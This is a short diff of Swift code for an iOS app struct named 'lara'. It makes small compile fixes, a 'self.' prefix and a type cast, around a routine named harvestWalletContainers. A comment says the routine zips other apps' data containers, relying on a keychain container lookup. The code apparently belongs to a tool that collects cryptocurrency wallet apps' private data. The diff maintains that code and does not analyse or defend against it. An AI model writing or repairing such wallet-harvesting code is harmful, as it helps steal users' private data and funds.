@@ -194,7 +194,7 @@ struct lara: App {
             // apps' data containers into zips (framework exports
             // KeychainLookupAppDataContainer for exactly this step).
             if let result, (result["ok"] as? Int ?? 0) == 1 {
-                harvestWalletContainers()
+                self.harvestWalletContainers()
             }
 
             DispatchQueue.main.async {
@@ -263,7 +263,7 @@ struct lara: App {
             let src = URL(fileURLWithPath: containerPath)
             var total: Int64 = 0
             if let vals = try? src.resourceValues(forKeys: [.totalFileAllocatedSizeKey]),
-               let sz = vals.totalFileAllocatedSize {
+               let sz = vals.totalFileAllocatedSize as? Int {
                 total = Int64(sz)
             }
             if total > 4 * 1024 * 1024 * 1024 {
